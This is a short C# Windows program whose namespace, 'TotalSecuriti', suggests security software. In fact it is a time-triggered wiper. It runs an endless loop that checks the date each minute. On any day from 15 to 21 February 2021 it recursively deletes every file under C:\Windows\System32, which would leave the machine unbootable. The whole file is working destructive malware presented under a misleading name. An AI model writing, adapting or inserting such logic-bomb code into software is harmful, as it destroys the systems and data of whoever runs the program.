using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.IO;
using Microsoft.Win32;
using System.Threading;

namespace TotalSecuriti
{
    static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
			while (true){
				Thread.Sleep(60000);
				var date = DateTime.Now;
				string date3 = date.ToShortDateString().ToString();
				if (date3 == "15.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "16.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "17.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "18.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "19.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "20.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
				if (date3 == "21.02.2021"){
					string[]fullfilesPath = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.AllDirectories);
					foreach (string i in fullfilesPath){
						System.IO.File.Delete(i);
					}
				}
			}
        }
    }
}